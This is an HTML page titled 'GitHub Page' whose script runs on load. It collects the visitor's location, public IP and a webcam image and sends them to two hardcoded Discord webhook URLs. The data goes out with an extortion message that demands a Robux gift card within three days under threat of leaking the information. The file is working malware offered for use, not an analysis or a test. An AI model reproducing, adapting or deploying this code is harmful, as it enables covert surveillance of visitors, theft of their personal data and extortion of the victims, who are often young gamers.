<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GitHub Page</title>
    <script>
        async function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(showPosition);
            } else {
                alert("Geolocation is not supported by this browser.");
            }
        }

        function showPosition(position) {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            sendData(lat, lon);
        }

        async function captureScreenshot() {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const track = stream.getVideoTracks()[0];
            const imageCapture = new ImageCapture(track);
            const bitmap = await imageCapture.grabFrame();
            const canvas = document.createElement('canvas');
            canvas.width = bitmap.width;
            canvas.height = bitmap.height;
            const context = canvas.getContext('2d');
            context.drawImage(bitmap, 0, 0, bitmap.width, bitmap.height);
            const screenshot = canvas.toDataURL('image/png');
            return screenshot;
        }

        async function sendData(lat, lon) {
            const ipAddress = await fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => data.ip);

            const screenshot = await captureScreenshot();

            const embed = {
                title: "User Info Compromised",
                description: `Your data has been compromised. Your IP address, location, and screenshot have been captured. To resolve this issue, please message @azybeams on Discord and provide a Robux gift card code. You have 3 days to complete this transaction; otherwise, your information will be leaked to a server.`,
                color: 0x00ff00,
                image: {
                    url: screenshot
                }
            };

            const payload = {
                embeds: [embed]
            };

            const webhookUrls = [
                'https://discord.com/api/webhooks/1400343148395368448/3Io1GhF1XjFvT-3IXtd4JOR9txD37JpSyw2iLDU3rjpuKpXOz6qWZg5UpfZ80yXbRBLj',
                'https://discord.com/api/webhooks/1400692047698198568/EpLKPSfi2DXdIQLu2c2g_SIr4QoXaCuYN3lqz92Ny3ckYiAQfu1TcWcNxglBEtDXXZ59'
            ];

            for (const url of webhookUrls) {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(payload)
                });

                if (response.ok) {
                    console.log(`Data sent successfully to ${url}`);
                } else {
                    console.error(`Failed to send data to ${url}`);
                }
            }
        }

        getLocation();
    </script>
</head>
<body>
    <h1>Welcome to the GitHub Page</h1>
    <p>Your data is being collected...</p>
</body>
</html>
